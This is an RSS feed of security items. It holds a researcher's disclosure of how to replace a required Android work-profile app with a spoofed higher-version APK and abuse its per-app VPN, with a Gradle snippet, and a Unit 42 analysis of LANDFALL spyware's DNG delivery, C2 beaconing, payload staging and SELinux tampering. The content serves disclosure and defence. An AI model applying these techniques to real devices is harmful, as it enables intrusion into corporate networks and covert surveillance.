			Due to a auto-install requirement in the Work Profile, which can be enforced via Intune, it is possible to convince the Play Store service (Finsky) to install an arbitrary app, with the same package name and a higher version number than the managed legit application. If a per-app VPN connection is configured via MS Tunnels and Defender application for the managed application, it is even possible to take over the VPN connection and have access to the internal systems.In June 2023, i had the chance to do some testing and research with Microsoft Intune and Android Enterprise in a (bring-your-own-device) BYOD scenario. Microsoft Intune is a cloud-based service that provides unified endpoint management, allowing organizations to manage and secure devices, applications, and data across various platforms, including Windows, macOS, iOS, and Android. Android Enterprise is a set of APIs and tools from Google that enables organizations to manage and secure Android devices for business use, allowing for the separation of work and personal data on a single device and providing granular control over apps and settings. The basic idea is to give the employees the opportunity to have business related apps with internal data on their phones, but in a secure way.During the analysis, we tested several vectors like if sharing data between private and work apps is enabled / possible, are screenshots enabled and stuff like that. We also noticed that some apps were required and auto downloaded due to company policies. Of course, this is all extremely dependant on the configuration of the respective policies pushed to the devices. Some not-so-interesting-compliance-checks-days later, we thought maybe it is possible to install arbitrary apps via ADB CLI. Since it is was private device (BYOD), the employee can activate the Developer Options options very easy.As we already knew, Android has multi user support and this is especially relevant for Work Profiles. Whenever a Work Profile is created on a device, an additional user is created with his own filesystem and relevant apps. This usually looks like this on a regular phone: main user is  and the Android Enterprise Work Profile user could be  (depending how many Work Profiles / other profiles were already created). This brings the advantage that the filesystem, system apps and everything relevant is absolutely isolated from one another. For useability and convenience reasons the Work Profile is then merged into the regular UI, as shown below: So we turned on the Developer settings and ADB on the phone tried to install an APK from our notebook via ADB CLI  and unfortunately it didnt work and was not installed. As we knew, the Work Profile has their own userid so we tried to install it via adb install --user 1 test.apk but this also did not work and we got a permission error.

			I can't really remember why (i think i got the hint from a stackoverflow article :D) but i then tried it to install a pretty basic self developed app with the package name  via Android Studio, with the configuration setting . Suprisingly, this worked. We had now an arbitrary app installed with our own package name in the private and the Work Profile. We added this finding to the report and wrapped it up.A couple of weeks later, in late August 2023, i wanted to come back to this problem, because i found it pretty weird that it wasn't possible to install arbitrary apps via ADB CLI, but it worked with Android Studio. So, i thought, maybe Android Studio sends some different ADB commands over USB or something. So, i set up an Intune trial tenant, created some policies according to the ones we saw in the engagement and created test users to login via the Company portal app on my test phone. I didn’t even get to the USB debugging part, because it did not work anymore.So, i debugged other things for several hours, tried several different apps and versions and could not figure out what was different than a couple of weeks ago. By suprise, i had a look at the Android Security Bulletin from July 2023 and saw a disclosed vulnerability which looked very suspiciously like a patch for our little party trick from June and my phone for testing was of course in auto-update mode.The patch had the following description:
[RESTRICT AUTOMERGE] Prevent installing apps in policy restricted work profile using ADB

If DISALLOW_DEBUGGING_FEATURES or DISALLOW_INSTALL_APPS restrictions are
set on a work profile, prevent side loading of APKs using ADB in the work profile.

			When i had closer look at the code, i wondered if it would be possible to install (update) an arbitrary app with the same package name as an already installed one. So i recreated the environment i had seen in June 2023, configured the Intune policies and added the  application to the required applications (automatic downloading and installing) of the group from my test user, because the seen environment from June 2023 also had this setting enabled. Some hours later and trying different things, i thought that it maybe should be possible to try and convince Android that my arbitrary app with the same package name as an already installed app, could be an update when the version number is higher than the actual one. 💡So i adjusted the  file of my sample app, with the assumption that the actual version name and version code of the application is  for example and the applicationId, namespace, packagename is known e.g. :
	[...]
	android {
	    namespace = "com.workday.workdroidapp"
	    compileSdk = 36

	    defaultConfig {
	        applicationId = "com.workday.workdroidapp"
	        minSdk = 31
	        targetSdk = 36
	        versionCode = 900000004
	        versionName = "9000000004.0"

	        testInstrumentationRunner = "androidx.test.runner.AndroidJUnitRunner"
	    }
	[...]
			When i checked that the setting to install for all users is still active and pressed the Debug button in Android Studio with the attached phone, i was immediatly greeted with the following notification:So i clicked  and immediatly saw the installation of my arbitrary app in the personal profile and the real Workday app, which we took the package name from for our arbitrary app, was deinstalled. I was a bit confused, because i actually thought after the error message it is not possible to update the legit app with my abitrary one and Android would just skip the installation to the Work Profile.I re-checked the company settings via Company Portal application on the phone and to my suprise, 1 minute later i saw a little notification from the Work Profile Play Store app (as i mentioned earlier, the work profile has their own set of system applications which are solely used for Work Profile stuff) that my application  has been successfully installed.At that point, i was totally confused. I repeated the steps several times, from uninstalling the work profile as a whole, reinstalling and onboarding via Company portal and then try to update the Workday app with my arbitrary one and it worked very reliable in 1-10min to replace the legit app with my arbitrary one, depending on the speed of which the policies and the missing required app (Workday) is checked and noticed on the device. I reread the patch from Android several times, and also checked the permission of the UserManager in the Work Profile, despite i just did a default configuration via Intune.So, I retested all of this in August 2025 with Android 16 (API Level 36) (Security Patch April 2025), as well as Android 13 (API Level 33) (Security Patch March 2024) and it still works. 

			
			  
			  
			  PoC with Android 13 (submitted to Android VRP with Security Patch August 2023):PoC with Android 16 (tested in August 2025 with Security Patch April 2025):So my idea why this whole chain worked was: When my arbitrary application is pushed to the device and to both users (private and work profile user) it gets installed for the private one, because there are no restrictions. For the Work Profile user, the APK gets pushed to the device into a temporary directory, then the check from the patch applies but fails because according to the usermanager object at least one of the flags DISALLOW_DEBUGGING_FEATURES or  is set for the Work Profile user and in parallel the legit app is deinstalled because it thinks it could be an update. At this point the legit app is deinstalled from the Work Profile. When then a recheck of the applied Intune policies via Company Portal is triggered, it also checks if all required apps are installed. When not, the Work Profile Play Store service (internal name Finsky) checks with Play Services online and also this temporary directory, compares the latest online version with the version in the temporary directory and if the temporary directory version is higher, then our arbitrary apps is installed. And most probably the Play Service does not check if the flags DISALLOW_DEBUGGING_FEATURES or  are set.So when i thought i had an idea why this happens and how it works, i was confident this could be a bypass for . So i opened an issue on the Google and Alphabet Vulnerability Reward Program (VRP) platform, documented everything and sent the bug report at end of August 2023.After a couple of weeks i got a response from Android VRP and with the answer that they consider this not as a vulnerability, the MDM needs to restrict this.In my opinion, the MDM does actually restrict this with the set flags (see pictures, left the private profile and right Work Profil) and the check also works, but there is most probably some sort of caching problem with the PlayStore service.Further Further Investigation - What could i do with my own app in a Work Profile?Besides the obvious, that usually sharing data between private and Work Profile is disabled, you have here a nice way to exfil data because you have now an application in the work context which you can share data to. Furthermore, there is also a setup i've seen in Intune with MS Tunnels, in which you can configure a per-app VPN. This means that a configured app on the device can connect via VPN to your network e.g. for an accounting application or internal employee directory. If you replace an application in the Work Profile with a configured per-app VPN setting with the party trick from above, it is also possible to use the VPN connection to the connected network with the arbitrary application.So of course, the prerequirements are very high, but if you're able to access someones BYOD device unlocked (Developer Settings need to be activated, otherwise you would need to know the device PIN/password to activate) you would be able to replace a legit business application with a malicous one for long-term access to company data. Additionally, if activated and if you are able to replace the correct one, you would also be able to pivot into the internal network via the per-app-VPN. To my current knowledge, the only setting that effectively mitigates this at the moment is disabling the automatic download and installation of apps (not configuring as ) in the Work Profile, but instead using available for enrolled devices setting. Other policies, such as disabling Developer Settings for all profiles or blocking installations from unknown sources, can be easily bypassed with proper timing. It it also questionable if employees would accept such a restriction on their private phone and in their private profile. Nonetheless the company tries to save money with not providing a dedicated work device and piggybacks the private ones.Let me know if you have additional ideas, then please ping me or let me know on X (https://x.com/joelgun)]]></content:encoded></item><item><title>NCCIA arrests man over massive data breach involving millions of Pakistanis</title><link>https://databreaches.net/2025/11/08/nccia-arrests-man-over-massive-data-breach-involving-millions-of-pakistanis/?pk_campaign=feed&amp;pk_kwd=nccia-arrests-man-over-massive-data-breach-involving-millions-of-pakistanis</link><author>Dissent</author><category>databreach</category><pubDate>Sat, 8 Nov 2025 13:01:53 +0000</pubDate><source url="https://databreaches.net/">Recent Data breaches</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Defense Contractors Are Silencing Their Cybersecurity Watchdogs</title><link>https://databreaches.net/2025/11/08/defense-contractors-are-silencing-their-cybersecurity-watchdogs/?pk_campaign=feed&amp;pk_kwd=defense-contractors-are-silencing-their-cybersecurity-watchdogs</link><author>Dissent</author><category>databreach</category><pubDate>Sat, 8 Nov 2025 12:53:23 +0000</pubDate><source url="https://databreaches.net/">Recent Data breaches</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Hackers Hijack Samsung Galaxy Phones via 0-Day Exploit Using a Single WhatsApp Image</title><link>https://cybersecuritynews.com/samsung-0-day-exploited-via-whatsapp/</link><author></author><category>security</category><pubDate>Sat, 8 Nov 2025 08:06:36 +0000</pubDate><source url="https://cvefeed.io/rssfeed/newsroom.xml">Latest Newsroom</source><content:encoded><![CDATA[

To deliver the spyware, attackers exploited a zero-day vulnerability (CVE-2025-21042) in Samsung’s Android image processing library. The specific flaw LANDFALL exploited, CVE-2025-21042, is not an isolated case but rather part of a broader pattern of similar issues found on multiple mobile platforms.This vulnerability was actively exploited in the wild before Samsung patched it in April 2025, following reports of in-the-wild attacks. However, the exploit itself — and the commercial-grade spyware used with it — have not yet been publicly reported and analyzed.LANDFALL was embedded in malicious image files (DNG file format) that appear to have been sent via WhatsApp. This method closely resembles an exploit chain involving Apple and WhatsApp that drew attention in August 2025. It also resembles an exploit chain that likely occurred using a similar zero-day vulnerability (CVE-2025-21043) disclosed in September. Our research did not identify any unknown vulnerabilities in WhatsApp.Importantly, our finding predates these disclosures — the LANDFALL campaign was already operating in mid-2024, using the zero-day Android/Samsung vulnerability (CVE-2025-21042) months before it was fixed.The vulnerability has been patched since April 2025, so there is no ongoing risk to current Samsung users. In September, Samsung also patched another zero-day vulnerability (CVE-2025-21043) in the same image processing library, further protecting against this type of attack.Our research looks back at historical exploitation that occurred before the patch, providing rare visibility into an advanced spyware operation that was publicly unreported.LANDFALL is Android spyware specifically designed against Samsung Galaxy devices, used in targeted intrusion activities within the Middle East.LANDFALL enabled comprehensive surveillance, including microphone recording, location tracking and collection of photos, contacts and call logs.The spyware is delivered through malformed DNG image files exploiting CVE-2025-21042 — a critical zero-day vulnerability in Samsung’s image processing library, which was exploited in the wild.The exploit chain possibly involved zero-click delivery using maliciously crafted images, similar to recent exploit chains seen on iOS and Samsung Galaxy.The campaign shares infrastructure and tradecraft patterns with commercial spyware operations in the Middle East, indicating possible links to private-sector offensive actors (PSOAs).LANDFALL remained active and undetected for months.Palo Alto Networks customers are better protected through the following products and services:LANDFALL Spyware DiscoveryIn mid-2025, following the public disclosure of an exploit chain targeting iOS devices, we searched for samples of the iOS exploit. This led to our discovery of the Android spyware that we called LANDFALL.Specifically, Unit 42 discovered several samples of DNG image files containing Android spyware used in an exploit chain targeting Samsung Galaxy devices. Our analysis confirmed these samples exploit CVE-2025-21042 to deliver LANDFALL, possibly via zero-click exploits on messaging applications.Beginning the Hunt: The iOS Exploit Chain and How It Made Us WonderIn August 2025, Apple issued OS security updates for its various products to address CVE-2025-43300, a zero-day vulnerability affecting DNG image parsing that attackers reportedly exploited in the wild.That same month, WhatsApp reported a zero-day vulnerability for CVE-2025-55177 that was chained with the image-processing vulnerability for Apple platforms in sophisticated attacks targeting iOS devices. The WhatsApp vulnerability allowed attackers to force devices to process content from arbitrary URLs.When the two vulnerabilities were combined in an exploit chain, this enabled zero-click remote code execution through maliciously crafted images sent via WhatsApp messages.Given the disclosure of this in-the-wild exploit chain and the absence of publicly available exploit samples, we initiated a hunt for this activity. Our search led to the discovery of several previously undetected DNG image files containing embedded Android spyware that were uploaded to VirusTotal throughout 2024 and early 2025.Judging by their filenames (e.g.,  and ), attackers likely delivered these samples via WhatsApp. Our analysis of the embedded spyware indicates it is designed for Samsung Galaxy devices.Malformed DNG Image Files: A New Attack Vector TrendOur analysis of LANDFALL spyware began with our discovery of malformed DNG image files. DNG stands for Digital Negative, and it is a raw image file format based on the TIFF image format. The malformed DNG image files we discovered have an embedded ZIP archive appended to the end of the file. Figure 1 shows one of these samples in a hex editor, indicating where the ZIP archive content begins near the end of the file.Our analysis indicates these DNG files exploit CVE-2025-21042, a vulnerability in Samsung's image-processing library  that Samsung patched in April 2025. The exploit extracts shared object library () files from the embedded ZIP archive to run LANDFALL spyware. Figure 2 below shows a flowchart for this spyware.Table 1 shows the DNG image samples we discovered.Filenames with strings like  and  imply attackers could have attempted to deliver the embedded Android spyware via WhatsApp. This matches earlier public reporting of similar DNG image-based exploitation through WhatsApp targeting Apple devices. Furthermore, WhatsApp researchers identified and reported a similar DNG vulnerability, CVE-2025-21043, to Samsung.Delivering LANDFALL Spyware: Mobile Device Malware Exploit ChainsTypically, mobile device malware distributed through exploits requires a chain of exploits across different vulnerabilities for successful infection. Various studies have documented cases of at least two vulnerabilities when distributing spyware, but modern exploit chains for spyware are far more complex [PDF], linking multiple vulnerabilities to compromise mobile devices and gain privileges.We have yet to discover any further exploits associated with this activity.LANDFALL Spyware AnalysisLANDFALL is Android spyware specifically designed for Samsung Galaxy devices, likely used in targeted intrusion activities within the Middle East. This modular spyware is engineered for espionage and data exfiltration.The infection chain for LANDFALL involves an exploit for CVE-2025-21042, a vulnerability in Samsung's image-processing library tracked by the vendor as Samsung Vulnerabilities and Exposures (SVE) designator SVE-2024-1969. We believe a full attack chain would follow a pattern of potential zero-click remote code execution, beginning with the delivery of the malformed DNG images.Two components of LANDFALL spyware are embedded within the malformed DNG images and would be extracted and executed, following a successful exploit:Loader (): An ARM64 ELF shared object (106 KB, stripped and dynamically linked) that serves as the main backdoor.SELinux Policy Manipulator (): Extracted from an XZ-compressed ELF binary, this component is designed to manipulate the device's SELinux policy to grant LANDFALL elevated permissions and aid persistence. (See Appendix A - SELinux Policy Manipulation.)Table 2 shows the LANDFALL component files embedded within the malicious DNG samples.Our analysis indicates LANDFALL is multi-component Android spyware designed for monitoring and data exfiltration.Our analysis focuses on the  component, which serves as the initial loader for a broader LANDFALL framework. In its own debug artifacts, the component refers to itself as “Bridge Head.” This will be of interest later when we discuss possible relationships between LANDFALL and known spyware groups.LANDFALL’s Potential CapabilitiesThe  component of LANDFALL contains numerous debug and status strings, but it does not contain the logic that actually references most of these strings. This suggests that  would download additional components for these capabilities. Our analysis of embedded command strings and execution paths within the  file provides insight into the broader LANDFALL's potential capabilities.Taking inventory of installed applicationsAccessing location servicesDatabases on the device (browsing history, etc.)Execution, Loading and PersistenceLoading native shared object () modulesLoading and executing DEX files from memory and diskExecuting arbitrary commandsModifying SELinux policy via compressed binaryMonitoring WhatsApp Media directory for additional payloadsRegistering WhatsApp web clientManipulating the file system in Android app directoriesManipulating the file systemEvasion and Defense AvoidanceDetecting TracerPid debuggerDetecting Frida instrumentation frameworkDetecting Xposed frameworkDynamic library loading with namespace manipulationCertificate pinning for C2 communicationsCleaning up WhatsApp images payloadGalaxy S23 Series (S91[168]BXX.*)Galaxy S24 Series (S921BXXU1AWM9, S92[168]BXX.*)Galaxy Z Fold4 (F936BXXS4DWJ1)Galaxy S22 (S901EXXS4CWD1)Galaxy Z Flip4 (F721BXXU1CWAC)Figure 3 shows an example of the targeted device model strings in a  sample of LANDFALL.The  component of LANDFALL communicates with its C2 server over HTTPS using a non-standard, ephemeral TCP port. Before the HTTPS traffic, it can initiate ping traffic as detailed in the Communication With the C2 Server section of Appendix B. For HTTPS traffic,  initiates contact with a POST request containing detailed device and spyware information, such as:Figure 4 shows an interpretation of this initial POST request, where we use  to show how this request would be structured. Of note, LANDFALL does not use  to generate this traffic.The initial beacon traffic is an HTTP POST request to the C2 server with the following parameters:: The protocol version (e.g., ): The protocol version (e.g., ""): The message type (e.g., ): The agent's unique identifier: An upload identifier: A command identifier: The source of the request (e.g., ): The incremental build version (e.g., ): The effective user ID of the process: The path to the  binary on the device: The runner mode (e.g., )Configuration of b.so FileThe  file's configuration is managed through a combination of hard-coded default values and an encrypted JSON object embedded within itself. This configuration includes C2 details, cryptographic keys and unique identifiers for the agent and commands.Figure 5 shows an example of this configuration.This  component of LANDFALL also contains a number of hard-coded configuration values. These are used as default values if they are not provided in the encrypted JSON object. We do not yet fully understand the purpose of some of these values. Table 3 shows these hard-coded default configuration values.C2 Infrastructure for LANDFALL SpywareBased on our analysis of these samples, we identified six C2 servers for LANDFALL, shown below in Table 4.How LANDFALL Fits Into the Larger PictureLANDFALL is one example of a larger pattern of exploit chains affecting mobile devices, related to DNG image processing vulnerabilities.The LANDFALL campaign's use of a malformed DNG file highlights a significant, recurring attack vector: the targeting of vulnerabilities within DNG image processing libraries. The specific flaw LANDFALL exploited, CVE-2025-21042, is not an isolated case but rather part of a broader pattern of similar issues found on multiple mobile platforms. In fact, earlier in 2025, Samsung identified another DNG flaw in the same Samsung library, CVE-2025-21043, and the parallel exploit chain on iOS was identified that leveraged CVE-2025-43300 in Apple iOS and CVE-2025-55177 in WhatsApp.Relationship to CVE-2025-21043 (SVE-2025-1702)Our analysis revealed a possible connection to a separate vulnerability in the same library, CVE-2025-21043 (SVE-2025-1702), which Samsung patched in its September 2025 security update. While it was not exploited in the LANDFALL samples we discovered, the similarities between the exploit for LANDFALL (CVE-2025-21042) and this vulnerability (CVE-2025-21043) are striking. Both vulnerabilities were publicly disclosed around the same time and both are connected to DNG image file processing delivered through mobile communication applications.In August 2025, Apple addressed CVE-2025-43300, a zero-day vulnerability impacting DNG image parsing, which was actively exploited in the wild, to enable zero-click remote code execution through malicious images sent via mobile communication applications.We cannot confirm whether this chain was used to deliver an equivalent of LANDFALL to iOS, or whether it is the same threat actor behind the two. However, this parallel development in the iOS ecosystem, combined with the disclosure of the Samsung and Apple vulnerabilities just a few weeks apart, highlights a broader pattern of DNG image processing vulnerabilities being leveraged in sophisticated mobile spyware attacks.July 2024 – February 2025: Initial samples of malicious DNG image files carrying LANDFALL are first submitted on VirusTotal in July 2024, with additional samples appearing periodically over the next several months.
The DNG files exploit a vulnerability in Samsung’s Android image processing library (SVE-2024-1969, CVE-2025-21042)Samsung issues a firmware update to address the vulnerability, SVE-2024-1969, later known as CVE-2025-21042 when publicly disclosed. Parallel developments occur.
Apple patches a zero-day vulnerability impacting DNG image parsing, which was actively exploited in the wild (CVE-2025-43300)WhatsApp discloses a vulnerability (CVE-2025-55177) that was chained with Apple’s DNG image parsing zero-day vulnerability (CVE-2025-43300)We discovered DNG image files exploiting CVE-2025-21042 to deliver Android spyware that we identified as LANDFALL.WhatsApp disclosed to Samsung CVE-2025-21043 — another DNG-related zero-day vulnerability in Samsung Galaxy devices. Samsung issues mobile device firmware updates for CVE-2025-21043 (SVE-2025-1702). Concurrently, it assigns CVE-2025-21042 (SVE-20254-1969) to the earlier vulnerability that previously had no CVE designator.Analysis of VirusTotal submission data for the malicious DNG files indicates potential targets in Iraq, Iran, Turkey and Morocco.Relationship to Known Spyware GroupsWhile we were unable to recover every component of the LANDFALL framework, it is clear that the tool is commercial grade. It may have utilized several zero-day exploits in its infection chain.Such tools are often developed and sold as commercial spyware and attributed to groups known as private sector offensive actors (PSOAs), who are often legitimate legal entities. Reportedly, these groups provide services to government entities.We were not able at this time to officially attribute LANDFALL activity to a known PSOA or threat actor. Unit 42 tracks the activity related to CVE-2025-21042 and LANDFALL as CL-UNK-1054.Two aspects are notable and worth highlighting.First, LANDFALL's C2 infrastructure and domain registration patterns share similarities to infrastructure associated with Stealth Falcon as observed by Unit 42. These similarities are based on various publicreports, as well as Stealth Falcon activity we have analyzed for targets in the Middle East.Second, in its own debug artifacts, the spyware component we analyzed refers to itself as “Bridge Head.” Of note, the term Bridge Head is a common nickname used by some private-sector offensive cyber companies (including NSO, Variston [PDF], Cytrox and Quadream) for first-stage loaders. However, this naming convention alone does not constitute a direct attribution link.While this is a common name used in commercial mobile spyware to describe loaders, it draws similarities to the Heliconica framework. This framework also contains references to “BridgeHead,” as Google TAG reported about spyware vendor Variston. Google identified Variston as a Barcelona-based PSOA (provider of exploits). Further analysis from Google and other reports indicated Variston's tooling was supplied to clients in the UAE through a reseller named Protect Electronic Systems (or Protected AE).This potential provider-client link to the UAE is noteworthy, as Microsoft and others reported that Stealth Falcon also operates heavily out of that country. Variston reportedly ceased operations in early 2025 following its public exposure.As of October 2025, except in infrastructure, we have not observed direct overlaps between the mobile campaigns of LANDFALL and the endpoint-based activity from Stealth Falcon, nor direct strong links with Stealth Falcon. However, the similarities are worth discussion.The discovery of LANDFALL spyware reveals a campaign targeting Samsung Android devices. The exploit chain involves CVE-2025-21042, a vulnerability that was patched by Samsung in April 2025. The presence of this spyware within DNG image files with WhatsApp-related naming conventions likely indicates attackers attempted to deliver the exploit through a messaging application.From the initial appearance of samples in July 2024, this activity highlights how sophisticated exploits can remain in public repositories for an extended period before being fully understood.The analysis of the loader reveals evidence of commercial-grade activity. The LANDFALL spyware components suggest advanced capabilities for stealth, persistence and comprehensive data collection from modern Samsung devices.However, we have not directly analyzed the next-stage components of the spyware. Additional details on this or on the exact delivery method would provide even more insight into the malicious activity.Palo Alto Networks customers are better protected from LANDFALL Android spyware through the following products:North America: Toll Free: +1 (866) 486-4842 (866.4.UNIT42)Europe and Middle East: +31.20.299.3130Australia: +61.2.4062.7950Palo Alto Networks has shared these findings with our fellow Cyber Threat Alliance (CTA) members.

Learn more about the Cyber Threat Alliance.A list of malware samples for LANDFALL activity is listed below in Table 7.Appendix A: SELinux Policy ManipulationLANDFALL's component for SELinux policy manipulation is . This file provides a capability to bypass system security controls. It is decompressed from  to  and executed.Rather than containing hard-coded rules,  implements a generic engine that can dynamically parse and load new SELinux policy statements from an external source, modifying the running policy in memory.Relevant and unique exported functions:: Load policy from binary data: Add individual policy statements: Serialize modified policy: Clean up policy objectsAppendix B: Additional Details on LANDFALL Spyware AnalysisThis appendix details the observed capabilities of the loader component of LANDFALL, as well as those we infer exist in other modules of the complete LANDFALL framework that we have not yet accessed.LANDFALL’s Bridge Head, named on the disk as , is loaded by an exploit on the device. Immediately after being loaded post‑exploit, LANDFALL parses  from the environment to avoid inheriting upstream preloads. It reads the effective user ID via  and stores it globally so later branches can adjust behavior for root versus non‑root. Then it calls into the main routine.It gathers process basics (parent , , Android build string), reads a  flag from the environment variable  and takes a copy of it for later actions. This value (typically  for interactive or  for passive) will be reported to the command and control and determine how it launches a later staged payload. It resolves its own mapped path, selects the app-private base at  as its working directory and then constructs two child paths there. One path is for the staged download and one is for the final  used for execution.LANDFALL reads and XOR-decrypts a JSON configuration directly from its own file. The spyware normalizes configuration by writing internal defaults back into the parsed object: numeric fields default when missing or zero, and certain booleans are coerced to fixed values regardless of the supplied configuration. Finally, it checks that a public key (X.509 DER) is present in the configuration and exits otherwise.Table 8 summarizes the configuration normalization performed at this stage.Communication With the C2 ServerOnce configuration is complete,  loads the necessary network and encryption functions, sets up its SSL environment, and prepares a secure client context for future HTTPS communication. If any part of this setup fails, it exits cleanly rather than risk a partial setup.Before entering the C2 beaconing loop, it optionally emits telemetry. If it is running as root, it formats a concise "started" line that includes:A fixed version marker (e.g., )It then sends that via a POST request to the C2 server, as shown below.If the runner mode is , it prepares the SELinux helper first: it locates the compressed policy helper (), inflates it via an internal XZ decoder into a fresh buffer, and writes the result to . Then it beacons to the C2 server by sending ping using the hyphen‑stripped  as payload. The outcome doesn’t gate the rest of the flow, and it serves as an operator telemetry.An example of code for an ‑mode  follows.Only then does the main C2 beaconing loop begin. It records time zero and enforces a strict wall‑clock budget of about 7,200 seconds () for the entire session.It zeros two large, reusable path buffers: one for the raw blob that may arrive from the server, and a sibling for the decompressed shared object. Both paths live under the app‑private working directory (e.g., ). With the paths ready, it contacts the command and control server by building a compact, URL‑encoded style body of  pairs:A protocol/variant tag; the beacon message typeThe ,  and a fresh  (UUIDv4) for correlationThe runner flag and its on‑disk install pathWhen applicable, it computes a SHA-1 over part of the message and appends it. It uses the following Chrome User‑Agent string:Requests are directed at the configured base path (e.g., ). Before any application data is sent, it pins the TLS connection.While reading the response from the C2 server, LANDFALL checks the response status code and looks through the headers to determine the message length and type. Some status codes — particularly timeouts and a masked set of / (e.g., , ) — are treated as transient and trigger  (default 35 seconds) before retrying with a fresh connection. A not‑found response (e.g., ) is considered terminal for this run and exits the loop. If the status indicates success and a body is present, LANDFALL proceeds to staging.Staging starts by cleaning up the file system state. If an old raw blob exists at the temporary path, it removes it. It writes the raw bytes to a staging file named  under the working directory, and then, attempts to decompress them using a built‑in XZ/LZMA decoder that inflates into a pre‑allocated approximately 5 MiB buffer.On success, it writes the decompressed bytes to  (the final  path) under the working directory, clears the temporary  and sets the file mode on  to  to ensure it’s loadable in various contexts.Example XZ inflater (trimmed):With the shared object in place (), it chooses an execution strategy based on the runner flag. For interactive setups (), it exports two environment variables and launches a benign system tool synchronously:The  points at the device path where SELinux policy content is expected, allowing the preloaded code to find and apply policy at startup. Note that this  is only used in interactive mode, the passive running path omits it.For passive runs (), it launches the same tool in the background:This is done so control returns quickly while the helper initializes in another process. Internally, both are dispatched via a shell wrapper (). In both cases, it accepts only narrow success results:exit code 0 or a specific ; anything else is treated as failure and breaks out of the loopOn successful load, it formats and sends an “ended” line mirroring the opening message including:It then frees transient strings and buffers. If no payload was available, or if a transient error occurred, it checks the elapsed wall‑clock time against its approximately 7,200‑second budget. If there’s time left, it sleeps the configured interval and tries again.Finally, when the loop finishes, either after a successful loading of the next stage or due to time budget or unrecoverable errors, it unwinds cleanly. If it is running as root, it prefers a  path instead of a normal return to minimize side effects in the runtime. In all cases, it aims to leave behind only the minimum artifacts needed for the staged code to continue.Unreferenced CapabilitiesDuring reverse engineering, we identified multiple routines compiled into the  component that are not invoked by its observed control flow. These latent features appear designed for use by the follow‑on modules loaded.It is also very probable that some of these functions are leftovers from older versions of LANDFALL. They reveal concrete behaviors oriented around WhatsApp media paths, DCIM discovery, file system staging and process hygiene on Android:One routine prepares a “started” telemetry line and then interacts with the device’s media subsystem. It formats the line:
If its internal checks pass, it executes a broadcast to force a gallery rescan using the exact shell:
In the same flow, it also constructs a “newest photo” probe over DCIM using:
This pattern is consistent with harvesting the latest camera item while excluding an artifact it can plant. This routine is compiled in but not called by any other code in the sample.WhatsApp media path planter. Another routine decodes a hard-coded Base64 1x1 PNG () and searches WhatsApp’s media directories on external storage for a recent file path that matches the agent’s identifier (the UUID is first stripped of hyphens). It builds and executes a search pipeline across both default (ID 0) and multi‑user (ID 95) paths:
.If such a path is returned, it writes the decoded PNG there verbatim. This looks like a cover‑artifact or covert marker stage aimed at WhatsApp images.Another helper takes a base directory and a string and returns one matching JPEG path by executing:
It trims trailing newlines and verifies the path exists before returning.Zygote avoidance check: A process‑hygiene helper allocates a buffer for its own  and returns success only when the name does not match  or . It is designed to avoid Android’s special host processes.SELinux symbol resolver and cleanup: Two small routines handle dynamic SELinux plumbing.
One  and resolves  and  into global function pointers.The other tears this down and clears the pointers.Both exist to support  work but are not referenced by the observed code path.A more substantial routine accepts a list of file system paths. For each, it saves the current label via , invokes an internal labeler on the path, applies ownership via  and then restores the saved label with . It returns distinct negative codes when  or  fail.There is a file probe that attempts to open a path and maps the outcome to internal status codes (success, permission denied, not found, generic error). It also resets internal library state (including any previously opened SELinux handles).Map process‑execution outcome to message status: A tiny mapper converts the result of an internal command‑execution helper into message catalog codes (e.g., mapping a specific return (1) to  code  and 2–3 to ). It standardizes reporting for helpers but is not reached by the current logic.Building a device‑report JSON array: Another dormant routine constructs a cJSON array where each entry carries , a Base64‑encoded binary field, a  boolean and a textual  derived from the internal  table. It walks an input vector, reads the referenced file into memory, Base64 encodes it and appends to the array.A small string‑templating helper finds occurrences of the token  inside a JSON value and replaces them with the runtime path tracked by the .Appending  to telemetry: A diagnostic helper parses , extracts the  line, converts it to an integer, and, if greater than zero, appends a formatted key/value into the request body via the ’s string‑builder.A staging helper concatenates an existing buffer with a pseudo‑random block derived from an input string:
It seeds a byte with It XORs each subsequent byte of the input into a rolling accumulatorIt writes the accumulator bytes as a suffixIt then writes the combined buffer to a given file path via the ’s writerA two‑step installer/uninstaller pair uses three config keys: ,  and . The main routine checks that all three are set, copies the backup back to the origin if needed and then deletes the payload file. It returns distinct status codes (//) that map to the message catalog entries for “no config,” “failed move” and “failed unlink.” A sibling routine conditionally creates or truncates the backup file ( with mode “”) when a global persistence flag is set.Battery percentage via : A utility reads battery capacity from the system’s power‑supply , checking two common locations:  and .Two routines set up and finalize the working directory under app‑private storage.
The first creates the directory tree, applies mode  (), temporarily adds execute to the parent and copies the resolved path into . And, when running as , it attempts to mount a  at that location to keep artifacts in memoryThe second (cleanup/finalize) can, when root and the directory exists, run  and ship the result home. It then restores the parent directory’s original mode and frees the path bufferProcess discovery by SELinux context and by : Two search helpers iterate , building and reading per‑PID files.
One compares  against a target SELinux context and then confirms the process has PPID 1The other compares  against a target On a match, they write the PID to an out‑parameter and return successDebug‑printing a variant array: A developer‑facing routine prints a small typed array structure. It formats type names from a table, dumps short byte arrays inside square brackets and emits a single character for a specific type, one element per line. This looks like leftover debugging and is not invoked by active code.None of these helpers are exercised by this component’s main execution loop. Their presence is consistent with a staged architecture in which subsequently loaded shared objects, forming the complete LANDFALL framework, expand collection and persistence using capabilities already compiled into this loader.]]></content:encoded></item><item><title>CVE-2020-36870 - Ruijie Gateway EG &amp; NBR Models v11.1(6)B9P1 - 11.9(4)B12P1 RCE</title><link>https://cvefeed.io/vuln/detail/CVE-2020-36870</link><author></author><category>vulns</category><pubDate>Fri, 7 Nov 2025 22:15:38 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2020-36870

